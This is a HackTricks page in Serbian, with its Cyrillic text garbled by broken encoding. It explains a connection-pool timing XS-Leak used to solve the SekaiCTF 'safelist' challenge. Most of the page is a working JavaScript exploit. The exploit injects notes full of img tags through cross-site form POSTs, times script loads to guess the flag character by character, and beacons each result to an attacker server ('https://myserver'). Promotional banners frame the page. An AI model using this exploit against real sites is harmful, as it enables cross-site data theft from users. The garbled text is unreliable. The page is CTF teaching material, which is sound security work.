# Connection Pool by Destination Example

<details>

<summary><strong>–ù–∞—É—á–∏—Ç–µ —Ö–∞–∫–æ–≤–∞—ö–µ AWS-–∞ –æ–¥ –Ω—É–ª–µ –¥–æ —Ö–µ—Ä–æ—ò–∞ —Å–∞</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –î–∞ –ª–∏ —Ä–∞–¥–∏—Ç–µ —É **–∫–æ–º–ø–∞–Ω–∏—ò–∏ –∑–∞ –∫–∏–±–µ—Ä-–±–µ–∑–±–µ–¥–Ω–æ—Å—Ç**? –ñ–µ–ª–∏—Ç–µ –ª–∏ –¥–∞ –≤–∏–¥–∏—Ç–µ **–≤–∞—à—É –∫–æ–º–ø–∞–Ω–∏—ò—É —Ä–µ–∫–ª–∞–º–∏—Ä–∞–Ω—É –Ω–∞ HackTricks**? –ò–ª–∏ –∂–µ–ª–∏—Ç–µ –¥–∞ –∏–º–∞—Ç–µ –ø—Ä–∏—Å—Ç—É–ø **–Ω–∞—ò–Ω–æ–≤–∏—ò–æ—ò –≤–µ—Ä–∑–∏—ò–∏ PEASS –∏–ª–∏ –¥–∞ –ø—Ä–µ—É–∑–º–µ—Ç–µ HackTricks —É PDF-—É**? –ü—Ä–æ–≤–µ—Ä–∏—Ç–µ [**–ü–õ–ê–ù–û–í–ï –ü–†–ï–¢–ü–õ–ê–¢–ï**](https://github.com/sponsors/carlospolop)!
* –û—Ç–∫—Ä–∏—ò—Ç–µ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü–∏—ò—É –µ–∫—Å–∫–ª—É–∑–∏–≤–Ω–∏—Ö [**NFT-–æ–≤–∞**](https://opensea.io/collection/the-peass-family)
* –ù–∞–±–∞–≤–∏—Ç–µ [**–∑–≤–∞–Ω–∏—á–Ω–∏ PEASS & HackTricks —Å—É–≤–µ–Ω–∏—Ä**](https://peass.creator-spring.com)
* **–ü—Ä–∏–¥—Ä—É–∂–∏—Ç–µ —Å–µ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord –≥—Ä—É–ø–∏**](https://discord.gg/hRep4RUj7f) –∏–ª–∏ [**—Ç–µ–ª–µ–≥—Ä–∞–º –≥—Ä—É–ø–∏**](https://t.me/peass) –∏–ª–∏ **–ø—Ä–∞—Ç–∏—Ç–µ** –º–µ –Ω–∞ **–¢–≤–∏—Ç–µ—Ä—É** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥–µ–ª–∏—Ç–µ —Å–≤–æ—ò–µ —Ö–∞–∫–µ—Ä—Å–∫–µ —Ç—Ä–∏–∫–æ–≤–µ —Å–ª–∞—ö–µ–º PR-–æ–≤–∞ –Ω–∞** [**hacktricks —Ä–µ–ø–æ**](https://github.com/carlospolop/hacktricks) **–∏** [**hacktricks-cloud —Ä–µ–ø–æ**](https://github.com/carlospolop/hacktricks-cloud).

</details>

–£ [**–æ–≤–æ–º –µ–∫—Å–ø–ª–æ–∏—Ç—É**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-safelist-html), [**@terjanq**](https://twitter.com/terjanq) –ø—Ä–µ–¥–ª–∞–∂–µ —ò–æ—à —ò–µ–¥–Ω–æ —Ä–µ—à–µ—ö–µ –∑–∞ –∏–∑–∞–∑–æ–≤–µ –ø–æ–º–µ–Ω—É—Ç–µ –Ω–∞ —Å–ª–µ–¥–µ—õ–æ—ò —Å—Ç—Ä–∞–Ω–∏—Ü–∏:

{% content-ref url="connection-pool-by-destination-example.md" %}
[connection-pool-by-destination-example.md](connection-pool-by-destination-example.md)
{% endcontent-ref %}

–•–∞—ò–¥–µ –¥–∞ –≤–∏–¥–∏–º–æ –∫–∞–∫–æ –æ–≤–∞—ò –µ–∫—Å–ø–ª–æ–∏—Ç —Ä–∞–¥–∏:

* –ù–∞–ø–∞–¥–∞—á —õ–µ —É–±–∞—Ü–∏—Ç–∏ –±–µ–ª–µ—à–∫—É —Å–∞ —à—Ç–æ –≤–∏—à–µ **`<img`** —Ç–∞–≥–æ–≤–∞ –∫–æ—ò–∏ —É—á–∏—Ç–∞–≤–∞—ò—É **`/js/purify.js`** (–≤–∏—à–µ –æ–¥ 6 –¥–∞ –±–ª–æ–∫–∏—Ä–∞ –∏–∑–≤–æ—Ä).
* –ó–∞—Ç–∏–º, –Ω–∞–ø–∞–¥–∞—á —õ–µ **—É–∫–ª–æ–Ω–∏—Ç–∏** –±–µ–ª–µ—à–∫—É —Å–∞ –∏–Ω–¥–µ–∫—Å–æ–º 1.
* –ó–∞—Ç–∏–º, –Ω–∞–ø–∞–¥–∞—á —õ–µ \[–Ω–∞—Ç–µ—Ä–∞—Ç–∏ **–±–æ—Ç–∞ –¥–∞ –ø—Ä–∏—Å—Ç—É–ø–∏ —Å—Ç—Ä–∞–Ω–∏—Ü–∏** —Å–∞ –ø—Ä–µ–æ—Å—Ç–∞–ª–∏–º –±–µ–ª–µ—à–∫–∞–º–∞] –∏ –ø–æ—à–∞—ô–µ **–∑–∞—Ö—Ç–µ–≤** –Ω–∞ **`victim.com/js/purify.js`** –∫–æ—ò–∏ —õ–µ **–º–µ—Ä–∏—Ç–∏ –≤—Ä–µ–º–µ**.
* –ê–∫–æ —ò–µ –≤—Ä–µ–º–µ **–≤–µ—õ–µ**, –∏–Ω—ò–µ–∫—Ü–∏—ò–∞ —ò–µ –±–∏–ª–∞ —É **–æ—Å—Ç–∞–≤—ô–µ–Ω–æ—ò –±–µ–ª–µ—à—Ü–∏**, –∞–∫–æ —ò–µ –≤—Ä–µ–º–µ **–Ω–∏–∂–µ**, –∑–∞—Å—Ç–∞–≤–∞ —ò–µ –±–∏–ª–∞ —Ç–∞–º–æ.

{% hint style="info" %}
–ò—Å–∫—Ä–µ–Ω–æ, —á–∏—Ç–∞—ò—É—õ–∏ —Å–∫—Ä–∏–ø—Ç—É, –ø—Ä–æ–ø—É—Å—Ç–∏–æ —Å–∞–º –¥–µ–æ –≥–¥–µ **–Ω–∞–ø–∞–¥–∞—á –Ω–∞—Ç–µ—Ä–∞ –±–æ—Ç–∞ –¥–∞ —É—á–∏—Ç–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –¥–∞ –ø–æ–∫—Ä–µ–Ω–µ img —Ç–∞–≥–æ–≤–µ**, –Ω–µ –≤–∏–¥–∏–º –Ω–∏—à—Ç–∞ —Å–ª–∏—á–Ω–æ —É –∫–æ–¥—É.
{% endhint %}

\`\`\`html const SITE\_URL = 'https://safelist.ctf.sekai.team/'; const PING\_URL = 'https://myserver'; function timeScript(){ return new Promise(resolve => { var x = document.createElement('script'); x.src = 'https://safelist.ctf.sekai.team/js/purify.js?' + Math.random(); var start = Date.now(); x.onerror = () => { console.log(\`Time: ${Date.now() - start}\`); //Time request resolve(Date.now() - start); x.remove(); } document.body.appendChild(x); }); } add\_note = async (note) => { let x = document.createElement('form') x.action = SITE\_URL + "create" x.method = "POST" x.target = "xxx"

let i = document.createElement("input"); i.type = "text" i.name = "text" i.value = note x.appendChild(i) document.body.appendChild(x) x.submit() }

remove\_note = async (note\_id) => { let x = document.createElement('form') x.action = SITE\_URL+"remove" x.method = "POST" x.target = "\_blank"

let i = document.createElement("input"); i.type = "text" i.name = "index" i.value = note\_id x.appendChild(i) document.body.appendChild(x) x.submit() }

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms)); // }zyxwvutsrqponmlkjihgfedcba\_ const alphabet = 'zyxwvutsrqponmlkjihgfedcba\_' var prefix = 'SEKAI{xsleakyay'; const TIMEOUT = 500; async function checkLetter(letter){ // Chrome puts a limit of 6 concurrent request to the same origin. We are creating a lot of images pointing to purify.js // Depending whether we found flag's letter it will either load the images or not. // With timing, we can detect whether Chrome is processing purify.js or not from our site and hence leak the flag char by char. const payload = `${prefix}${letter}` + Array.from(Array(78)).map((e,i)=>`<img/src=/js/purify.js?${i}>`).join(''); await add\_note(payload); await sleep(TIMEOUT); await timeScript(); await remove\_note(1); //Now, only the note with the flag or with the injection existsh await sleep(TIMEOUT); const time = await timeScript(); //Find out how much a request to the same origin takes navigator.sendBeacon(PING\_URL, \[letter,time]); if(time>100){ return 1; } return 0; } window.onload = async () => { navigator.sendBeacon(PING\_URL, 'start'); // doesnt work because we are removing flag after success. // while(1){ for(const letter of alphabet){ if(await checkLetter(letter)){ prefix += letter; navigator.sendBeacon(PING\_URL, prefix); break; } } // } };

```
<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? ≈Ωelite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili ≈æelite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
```
